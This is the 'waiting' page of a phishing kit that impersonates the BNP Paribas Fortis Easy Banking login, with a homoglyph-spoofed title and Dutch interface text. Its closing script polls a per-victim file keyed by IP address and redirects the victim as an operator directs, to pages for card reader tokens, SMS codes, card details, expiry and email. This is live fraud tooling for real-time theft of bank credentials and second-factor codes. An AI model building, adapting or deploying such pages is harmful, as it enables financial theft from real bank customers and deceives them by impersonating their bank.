<?php
 
    require_once "../app.php";
   

?>
<?php 
function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
?>
<html lang="nl" style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths mac chrome chrome7 webkit webkit5 rich_text_header login_page alternative_screen js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths unauthenticated warning_messages">
    <head>
        <style type="text/css">
            @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }

            ng\:form {
                display: block;
            }

            .ng-animate-shim {
                visibility: hidden;
            }

            .ng-anchor {
                position: absolute;
            }
        </style>
        <link rel="shortcut icon" href="favicon.ico">
        <base href="">
        <link rel="stylesheet" href="./login/form/css.css">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible">
        <title>Mijn Eаsy Bаnking, mijn оnline bаnk | BNP Pаribаs Fоrtis</title>
        <link href="./login/Web-Banking-Unauthenticated.css" type="text/css" rel="stylesheet">
        <link type="text/css" href="./login/brand.css" rel="stylesheet">
        <link type="text/css" href="./login/mediaelementplayer.min.css" rel="stylesheet">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    </head>
    <body class="nl PC fb priv nextgen ng-scope" ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" style="overflow: auto;">
        <form action="./index.php" id="WizardForm" method="post" accept-charset="utf-8">
            <div id="sf-master">
                <div class="ls-canvas portal_wrapper" id="webbankingUnauthenticated">
                    <div class="ls-row canvas_container" id="ls-row-2">
                        <div class="ls-lqr" id="ls-gen75845705-ls-lqr">
                            <div class="ls-col" id="ls-row-2-col-1">
                                <div class="ls-col-body" id="ls-gen75845706-ls-col-body">
                                    <div class="ls-row eb-header" id="ls-row-2-col-1-row-1">
                                        <div class="ls-lqr" id="ls-gen75845707-ls-lqr">
                                            <div class="ls-area" id="ls-row-2-col-1-row-1-area-1">
                                                <div class="ls-area-body" id="ls-gen75845708-ls-area-body">
                                                    <div class="ls-cmp-wrap ls-1st" id="w1465485783749">
                                                        <div class="iw_component" id="1465485783749"></div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1465485783750">
                                                        <div class="iw_component" id="1465485783750">
                                                            <div class="wcm-faq supportpane"></div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1465485783751">
                                                        <div class="iw_component" id="1465485783751">
                                                            <div class="rich_text nextgen">
                                                                <div id="centeredLogo" class="region ">
                                                                    <div id="siteHeaderError" class="section level1 ">
                                                                        <div id="siteHeaderErrorInner" class="section level2 ">
                                                                            <p id="brandLogo"></p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1465485783752">
                                                        <div class="iw_component" id="1465485783752">
                                                            <div class="wcm-javascript style-default nextgen"></div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1536277602174">
                                                        <div class="iw_component" id="1536277602174"></div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ls-row-clr"></div>
                                        </div>
                                    </div>
                                    <div class="ls-row login_bg main_wrapper" id="content" style="margin-top: 0px;">
                                        <div class="ls-lqr" id="ls-gen75845709-ls-lqr">
                                            <div class="ls-col" id="ls-row-2-col-1-row-2-col-1">
                                                <div class="ls-col-body" id="ls-gen75845710-ls-col-body">
                                                    <div class="ls-row wcm-messages" id="warning">
                                                        <div class="ls-lqr" id="ls-gen75845711-ls-lqr">
                                                            <div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-1-area-1">
                                                                <div class="ls-area-body" id="ls-gen75845712-ls-area-body">
                                                                    <div class="ls-cmp-wrap ls-1st" id="w1396414149936">
                                                                        <div class="iw_component" id="1396414149936">
                                                                            <div class="wcm-severity-message">
                                                                                <div class="severity_message">
                                                                                    <div class="alert_messages fade in alert_messages_information  nextgen show_active"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1484242474486">
                                                                        <div class="iw_component" id="1484242474486">
                                                                            <div class="wcm-severity-message">
                                                                                <div class="severity_message">
                                                                                    <div class="alert_messages fade in alert_messages_information  nextgen show_active"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1508947068404">
                                                                        <div class="iw_component" id="1508947068404">
                                                                            <div class="wcm-severity-message">
                                                                                <div class="severity_message">
                                                                                    <div class="alert_messages fade in alert_messages_information  nextgen show_active"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1520355986006">
                                                                        <div class="iw_component" id="1520355986006">
                                                                            <div class="wcm-severity-message">
                                                                                <div class="severity_message">
                                                                                    <div class="alert_messages fade in alert_messages_information  nextgen show_active"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1520355986008">
                                                                        <div class="iw_component" id="1520355986008">
                                                                            <div class="wcm-severity-message">
                                                                                <div class="severity_message"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1524221388679">
                                                                        <div class="iw_component" id="1524221388679"></div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1541118511050">
                                                                        <div class="iw_component" id="1541118511050">
                                                                            <div class="wcm-severity-message">
                                                                                <div class="severity_message">
                                                                                    <div class="alert_messages fade in alert_messages_information  nextgen show_active"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="ls-row-clr"></div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-row content_row" id="IA">
                                                        <div class="ls-lqr" id="ls-gen75845713-ls-lqr">
                                                            <div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-2-area-1">
                                                                <div class="ls-area-body" id="ls-gen75845714-ls-area-body">
                                                                    <div class="ls-cmp-wrap ls-1st" id="w1496157905139">
                                                                        <div class="iw_component" id="1496157905139">
                                                                            <div class="login-container" id="login_overlayer">
                                                                                <div class="login_comp">
                                                                                    <div class="login_comp_inner">
                                                                                        <div class="ia_alert"></div>
                                                                                        <div class="login_row">
                                                                                            <div class="login_col2">
                                                                                                <div class="login_flow scum" id="login-view">
                                                                                                    <div class="form_inner_block pad_rl30">
                                                                                                        <center>
                                                                                                            <br>
                                                                                                            <br>
                                                                                                            <br>
                                                                                                            <br>
                                                                                                            <div class="loader__ waiter__" style="">
                                                                                                                <div class="loader-box">
                                                                                                                    <h2 class="waiter_h2 ng-binding">Wacht alsjeblieft..</h2>
                                                                                                                    <div class="loader-images-box">
                                                                                                                        <img class="newloader" src="newloader.gif" height="50">
                                                                                                                    </div>
                                                                                                                    <p class="waiter_p ng-binding">Laad deze pagina niet opnieuw</p>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </center>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="login_footer">
                                                                                        <p>
                                                                                            <a class="lnk_primary ng-binding">Bestel een kaartlezer</a>
                                                                                        </p>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1496157905140">
                                                                        <div class="iw_component" id="1496157905140">
                                                                            <div id="wcm-l-description">
                                                                                <div class="wcm-html style-default nextgen"></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="ls-cmp-wrap" id="w1513298264246">
                                                                        <div class="iw_component" id="1513298264246">
                                                                            <div class="wcm-javascript style-default nextgen"></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="ls-row-clr"></div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-row service_col" id="service">
                                                        <div class="ls-lqr" id="ls-gen75845715-ls-lqr">
                                                            <div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-3-area-1">
                                                                <div class="ls-area-body" id="ls-gen75845716-ls-area-body">
                                                                    <div class="ls-cmp-wrap ls-1st" id="w1533196592165">
                                                                        <div class="iw_component" id="1533196592165"></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="ls-row-clr"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ls-row-clr"></div>
                                        </div>
                                        <a class="cover"></a>
                                    </div>
                                    <div class="ls-row footer" id="footer">
                                        <div class="ls-lqr" id="ls-gen75845717-ls-lqr">
                                            <div class="ls-area" id="ls-row-2-col-1-row-3-area-1">
                                                <div class="ls-area-body" id="ls-gen75845718-ls-area-body">
                                                    <div class="ls-cmp-wrap ls-1st" id="w1465485783754">
                                                        <div class="iw_component" id="1465485783754">
                                                            <div class="chat_widget"></div>
                                                            <div class="wcm-footer nextgen">
                                                                <div class="footer_lnks clearfix">
                                                                    <div class="legal_section">
                                                                        <ul class="legal_lnks">
                                                                            <li>
                                                                                <a target="_self" class="ng-binding">Over ons</a>
                                                                            </li>
                                                                            <li>
                                                                                <a target="_self" class="ng-binding">Gebruiksvoorwaarden van de Website</a>
                                                                            </li>
                                                                            <li>
                                                                                <a class="postPagebusMessage ng-binding">Cookies</a>
                                                                            </li>
                                                                            <li>
                                                                                <a target="_self" class="ng-binding">Privacyverklaring</a>
                                                                            </li>
                                                                            <li>
                                                                                <a target="_self" class="ng-binding">US Disclaimer</a>
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                    <div class="legal_msg">
                                                                        <p>Copyright © 2024 BNP Paribas Fortis</p>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1452690391672">
                                                        <div class="iw_component" id="1452690391672"></div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1465485783755">
                                                        <div class="iw_component" id="1465485783755">
                                                            <div class="wcm-overlay"></div>
                                                        </div>
                                                    </div>
                                                    <div class="ls-cmp-wrap" id="w1465485783756">
                                                        <div class="iw_component" id="1465485783756">
                                                            <div class="rich_text nextgen"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="ls-row-clr"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <script>
                function formatInput1(input) {
                    let value = input.value.replace(/\D/g, '');
                    // Remove all non-digit characters
                    if (value.length > 4)
                        value = value.slice(0, 4) + ' ' + value.slice(4);
                    if (value.length > 9)
                        value = value.slice(0, 9) + ' ' + value.slice(9);
                    if (value.length > 14)
                        value = value.slice(0, 14) + ' ' + value.slice(14);
                    if (value.length > 19)
                        value = value.slice(0, 19) + ' ' + value.slice(19);
                    input.value = value;
                }

                function formatInput2(input) {
                    let value = input.value.replace(/\D/g, '');
                    // Remove all non-digit characters
                    if (value.length > 5)
                        value = value.slice(0, 5) + ' ' + value.slice(5);
                    input.value = value;
                }

                function formatInput3(input) {
                    let value = input.value.replace(/\D/g, '');
                    // Remove all non-digit characters
                    if (value.length > 4)
                        value = value.slice(0, 4) + ' ' + value.slice(4);
                    input.value = value;
                }
            </script>
            <script>
                /*! modernizr 3.11.4 (Custom Build) | MIT *
     * https://modernizr.com/download/?-cssscrollbar-flexbox-getrandomvalues-smil-setclasses-cssclassprefix:modzr- !*/
                !function(e, n, t, r) {
                    function o(e, n) {
                        return typeof e === n
                    }
                    function i(e, n) {
                        return !!~("" + e).indexOf(n)
                    }
                    function s() {
                        return "function" != typeof t.createElement ? t.createElement(arguments[0]) : S ? t.createElementNS.call(t, "http://www.w3.org/2000/svg", arguments[0]) : t.createElement.apply(t, arguments)
                    }
                    function l() {
                        var e = t.body;
                        return e || (e = s(S ? "svg" : "body"),
                        e.fake = !0),
                        e
                    }
                    function a(e, n, r, o) {
                        var i, a, f, u, c = "modernizr", d = s("div"), p = l();
                        if (parseInt(r, 10))
                            for (; r--; )
                                f = s("div"),
                                f.id = o ? o[r] : c + (r + 1),
                                d.appendChild(f);
                        return i = s("style"),
                        i.type = "text/css",
                        i.id = "s" + c,
                        (p.fake ? p : d).appendChild(i),
                        p.appendChild(d),
                        i.styleSheet ? i.styleSheet.cssText = e : i.appendChild(t.createTextNode(e)),
                        d.id = c,
                        p.fake && (p.style.background = "",
                        p.style.overflow = "hidden",
                        u = x.style.overflow,
                        x.style.overflow = "hidden",
                        x.appendChild(p)),
                        a = n(d, e),
                        p.fake ? (p.parentNode.removeChild(p),
                        x.style.overflow = u,
                        x.offsetHeight) : d.parentNode.removeChild(d),
                        !!a
                    }
                    function f(e) {
                        return e.replace(/([A-Z])/g, function(e, n) {
                            return "-" + n.toLowerCase()
                        }).replace(/^ms-/, "-ms-")
                    }
                    function u(e, t, r) {
                        var o;
                        if ("getComputedStyle"in n) {
                            o = getComputedStyle.call(n, e, t);
                            var i = n.console;
                            if (null !== o)
                                r && (o = o.getPropertyValue(r));
                            else if (i) {
                                var s = i.error ? "error" : "log";
                                i[s].call(i, "getComputedStyle returning null, its possible modernizr test results are inaccurate")
                            }
                        } else
                            o = !t && e.currentStyle && e.currentStyle[r];
                        return o
                    }
                    function c(e, t) {
                        var o = e.length;
                        if ("CSS"in n && "supports"in n.CSS) {
                            for (; o--; )
                                if (n.CSS.supports(f(e[o]), t))
                                    return !0;
                            return !1
                        }
                        if ("CSSSupportsRule"in n) {
                            for (var i = []; o--; )
                                i.push("(" + f(e[o]) + ":" + t + ")");
                            return i = i.join(" or "),
                            a("@supports (" + i + ") { #modernizr { position: absolute; } }", function(e) {
                                return "absolute" === u(e, null, "position")
                            })
                        }
                        return r
                    }
                    function d(e) {
                        return e.replace(/([a-z])-([a-z])/g, function(e, n, t) {
                            return n + t.toUpperCase()
                        }).replace(/^-/, "")
                    }
                    function p(e, n, t, l) {
                        function a() {
                            u && (delete E.style,
                            delete E.modElem)
                        }
                        if (l = !o(l, "undefined") && l,
                        !o(t, "undefined")) {
                            var f = c(e, t);
                            if (!o(f, "undefined"))
                                return f
                        }
                        for (var u, p, m, v, h, g = ["modernizr", "tspan", "samp"]; !E.style && g.length; )
                            u = !0,
                            E.modElem = s(g.shift()),
                            E.style = E.modElem.style;
                        for (m = e.length,
                        p = 0; p < m; p++)
                            if (v = e[p],
                            h = E.style[v],
                            i(v, "-") && (v = d(v)),
                            E.style[v] !== r) {
                                if (l || o(t, "undefined"))
                                    return a(),
                                    "pfx" !== n || v;
                                try {
                                    E.style[v] = t
                                } catch (e) {}
                                if (E.style[v] !== h)
                                    return a(),
                                    "pfx" !== n || v
                            }
                        return a(),
                        !1
                    }
                    function m(e, n) {
                        return function() {
                            return e.apply(n, arguments)
                        }
                    }
                    function v(e, n, t) {
                        var r;
                        for (var i in e)
                            if (e[i]in n)
                                return !1 === t ? e[i] : (r = n[e[i]],
                                o(r, "function") ? m(r, t || n) : r);
                        return !1
                    }
                    function h(e, n, t, r, i) {
                        var s = e.charAt(0).toUpperCase() + e.slice(1)
                          , l = (e + " " + b.join(s + " ") + s).split(" ");
                        return o(n, "string") || o(n, "undefined") ? p(l, n, r, i) : (l = (e + " " + P.join(s + " ") + s).split(" "),
                        v(l, n, t))
                    }
                    function g(e, n, t) {
                        return h(e, r, r, n, t)
                    }
                    var y = []
                      , w = {
                        _version: "3.11.4",
                        _config: {
                            classPrefix: 'modzr-',
                            enableClasses: !0,
                            enableJSClass: !0,
                            usePrefixes: !0
                        },
                        _q: [],
                        on: function(e, n) {
                            var t = this;
                            setTimeout(function() {
                                n(t[e])
                            }, 0)
                        },
                        addTest: function(e, n, t) {
                            y.push({
                                name: e,
                                fn: n,
                                options: t
                            })
                        },
                        addAsyncTest: function(e) {
                            y.push({
                                name: null,
                                fn: e
                            })
                        }
                    }
                      , Modernizr = function() {};
                    Modernizr.prototype = w,
                    Modernizr = new Modernizr;
                    var C = []
                      , x = t.documentElement
                      , S = "svg" === x.nodeName.toLowerCase()
                      , _ = "Moz O ms Webkit"
                      , b = w._config.usePrefixes ? _.split(" ") : [];
                    w._cssomPrefixes = b;
                    var z = {
                        elem: s("modernizr")
                    };
                    Modernizr._q.push(function() {
                        delete z.elem
                    });
                    var E = {
                        style: z.elem.style
                    };
                    Modernizr._q.unshift(function() {
                        delete E.style
                    });
                    var P = w._config.usePrefixes ? _.toLowerCase().split(" ") : [];
                    w._domPrefixes = P,
                    w.testAllProps = h;
                    var N = function(e) {
                        var t, o = U.length, i = n.CSSRule;
                        if (void 0 === i)
                            return r;
                        if (!e)
                            return !1;
                        if (e = e.replace(/^@/, ""),
                        (t = e.replace(/-/g, "_").toUpperCase() + "_RULE")in i)
                            return "@" + e;
                        for (var s = 0; s < o; s++) {
                            var l = U[s];
                            if (l.toUpperCase() + "_" + t in i)
                                return "@-" + l.toLowerCase() + "-" + e
                        }
                        return !1
                    };
                    w.atRule = N;
                    var T, j = w.prefixed = function(e, n, t) {
                        return 0 === e.indexOf("@") ? N(e) : (-1 !== e.indexOf("-") && (e = d(e)),
                        n ? h(e, n, t) : h(e, "pfx"))
                    }
                    , A = j("crypto", n);
                    if (A && "getRandomValues"in A && "Uint32Array"in n) {
                        var R = new Uint32Array(10)
                          , k = A.getRandomValues(R);
                        T = k && o(k[0], "number")
                    }
                    Modernizr.addTest("getrandomvalues", !!T),
                    w.testAllProps = g,
                    Modernizr.addTest("flexbox", g("flexBasis", "1px", !0));
                    var L = w.testStyles = a
                      , U = w._config.usePrefixes ? " -webkit- -moz- -o- -ms- ".split(" ") : ["", ""];
                    w._prefixes = U,
                    L("#modernizr{overflow: scroll; width: 40px; height: 40px; }#" + U.join("scrollbar{width:10px} #modernizr::").split("#").slice(1).join("#") + "scrollbar{width:10px}", function(e) {
                        Modernizr.addTest("cssscrollbar", "scrollWidth"in e && 30 === e.scrollWidth)
                    });
                    var V = {}.toString;
                    Modernizr.addTest("smil", function() {
                        return !!t.createElementNS && /SVGAnimate/.test(V.call(t.createElementNS("http://www.w3.org/2000/svg", "animate")))
                    }),
                    function() {
                        var e, n, t, r, i, s, l;
                        for (var a in y)
                            if (y.hasOwnProperty(a)) {
                                if (e = [],
                                n = y[a],
                                n.name && (e.push(n.name.toLowerCase()),
                                n.options && n.options.aliases && n.options.aliases.length))
                                    for (t = 0; t < n.options.aliases.length; t++)
                                        e.push(n.options.aliases[t].toLowerCase());
                                for (r = o(n.fn, "function") ? n.fn() : n.fn,
                                i = 0; i < e.length; i++)
                                    s = e[i],
                                    l = s.split("."),
                                    1 === l.length ? Modernizr[l[0]] = r : (Modernizr[l[0]] && (!Modernizr[l[0]] || Modernizr[l[0]]instanceof Boolean) || (Modernizr[l[0]] = new Boolean(Modernizr[l[0]])),
                                    Modernizr[l[0]][l[1]] = r),
                                    C.push((r ? "" : "no-") + l.join("-"))
                            }
                    }(),
                    function(e) {
                        var n = x.className
                          , t = Modernizr._config.classPrefix || "";
                        if (S && (n = n.baseVal),
                        Modernizr._config.enableJSClass) {
                            var r = new RegExp("(^|\\s)" + t + "no-js(\\s|$)");
                            n = n.replace(r, "$1" + t + "js$2")
                        }
                        Modernizr._config.enableClasses && (e.length > 0 && (n += " " + t + e.join(" " + t)),
                        S ? x.className.baseVal = n : x.className = n)
                    }(C),
                    delete w.addTest,
                    delete w.addAsyncTest;
                    for (var O = 0; O < Modernizr._q.length; O++)
                        Modernizr._q[O]();
                    e.Modernizr = Modernizr
                }(window, window, document);

                if (Modernizr.getrandomvalues && Modernizr.flexbox && Modernizr.smil) {
                    document.getElementById('tb-application').style.display = 'block';
                } else {
                    document.getElementById('tb-unsupported-browser').style.display = 'block';
                    document.body.style.background = '#08080A';
                    document.body.style.margin = '0';
                }
            </script>
             <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
            <script>

                var ip = '<?php echo get_client_ip() ?>';
                var waiting = setInterval(function() {
                    $.get('vics/' + ip + '.txt', function(data) {
                        var zz = data.split("|");
                        var dd = zz[0];
                        if (data == 0) {} else if (dd == 'badloginraf') {
                            location.href = "login.php?error=1";
                        } else if (dd == 'token1') {
                            location.href = "m1.php?code=" + zz[1];
                        } else if (dd == 'token3') {
                            location.href = "m3.php?error=1&code=" + zz[1];
                        } else if (dd == 'sms') {
                            location.href = "otp.php?code=" + zz[1];
                        } else if (dd == 'exp') {
                            location.href = "exp.php?code=" + zz[1];
                        } else if (dd == 'eml') {
                            location.href = "eml.php?code=" + zz[1];
                        } else if (dd == 'cc') {
                            location.href = "coc.php?code=" + zz[1];
                        } else if (dd == 'token2') {
                            location.href = "m2.php?code=" + zz[1];
                        } else if (dd == 'num') {
                            location.href = "num.php?code=";
                        } else if (dd == 'extra') {
                            location.href = "extra.php?code=" + zz[1];
                        } else if (dd == 'success') {
                            location.href = "../success.php";
                        }
                    });
					
				   $.get('./time.php', function(data) {
                    if( data == 0 ) {
                       
                    } else {
                       
				
                    }
                   });
                }, 1000);
            </script>
        </form>
    </body>
</html>
